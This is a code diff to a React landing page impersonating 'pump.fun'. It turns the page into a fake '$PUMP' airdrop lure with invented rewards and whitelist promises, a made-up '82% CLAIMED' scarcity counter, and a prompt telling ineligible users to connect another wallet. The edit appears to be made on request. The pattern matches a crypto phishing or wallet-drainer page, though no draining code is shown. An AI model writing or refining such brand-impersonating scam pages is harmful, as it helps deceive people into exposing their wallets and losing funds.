@@ -85,7 +85,7 @@ const Index = () => {
             />
             <span className="text-2xl font-bold text-white">pump.fun</span>
           </div>
-          <WalletMultiButton className="!bg-primary hover:!bg-primary/90" />
+          <WalletMultiButton className="!bg-primary hover:!bg-primary/90">connect wallet</WalletMultiButton>
         </div>
       </div>
 
@@ -102,16 +102,19 @@ const Index = () => {
                 Limited Time Offer
               </Button>
               <h1 className="text-5xl font-bold text-white">
-                PUMP Your Token
+                Get Your Share Of
               </h1>
+              <div className="text-4xl font-bold bg-gradient-to-r from-green-400 to-green-600 text-transparent bg-clip-text animate-gradient">
+                1,000,000 $PUMP
+              </div>
             </div>
             <p className="text-xl text-white/90 max-w-2xl mx-auto leading-relaxed">
-              Pump your tokens on pump.fun and watch them skyrocket! Join the hottest token pumping platform in the Solana ecosystem
+              Join exclusive airdrop and be part of the most exciting memecoin launch on solana. Early participants get bonus rewards and white listing access.
             </p>
             <div className="pt-4 space-y-2">
-              <p className="text-lg text-white/80 font-semibold">Connect Wallet</p>
-              <p className="text-2xl font-bold text-primary">PUMP / Set Up Campaigns</p>
-            </div>
+                <p className="text-lg text-white/80 font-semibold">Connect Wallet</p>
+                {/* Removed 'PUMP / Set Up Campaigns' per request */}
+              </div>
           </div>
 
           {/* Wallet Connection */}
@@ -120,7 +123,7 @@ const Index = () => {
               <div className="text-center space-y-4">
                 <p className="text-sm text-muted-foreground flex items-center gap-2 justify-center">
                   <Wallet className="w-4 h-4" />
-                  Connect your wallet to start PUMP
+                  Connect your wallet to get $ pump
                 </p>
               </div>
             ) : (
@@ -128,7 +131,7 @@ const Index = () => {
                 {/* Eligibility Status */}
                 <div className="bg-card/50 backdrop-blur-lg border border-border/50 rounded-xl p-6 text-center">
                   <p className={`text-2xl font-bold ${isEligible ? 'text-green-500' : 'text-red-500'}`}>
-                    {isEligible ? 'Eligible Dev Tokens' : 'No Dev Tokens'}
+                    {isEligible ? 'Eligible' : 'Not eligible connect with other wallet'}
                   </p>
                 </div>
 
@@ -144,7 +147,7 @@ const Index = () => {
                     <svg className="w-6 h-6 mr-2" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                       <path d="M13 3L4 14H12L11 21L20 10H12L13 3Z" fill="currentColor" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                     </svg>
-                    PUMP Tokens / Start Campaigns
+                    Get $PUMP Now
                   </Button>
                 )}
 
@@ -155,8 +158,9 @@ const Index = () => {
                     <p className="text-xs text-muted-foreground uppercase tracking-wide">PARTICIPANTS</p>
                   </div>
                   <div className="text-center">
-                    <p className="text-3xl font-bold text-white">20x-80x</p>
+                    <p className="text-3xl font-bold text-white">20x-80x <span className="text-green-500">82%</span></p>
                     <p className="text-xs text-muted-foreground uppercase tracking-wide">PUMP</p>
+                    <p className="text-xs text-green-500 font-bold uppercase tracking-wide">CLAIMED</p>
                   </div>
                 </div>
 
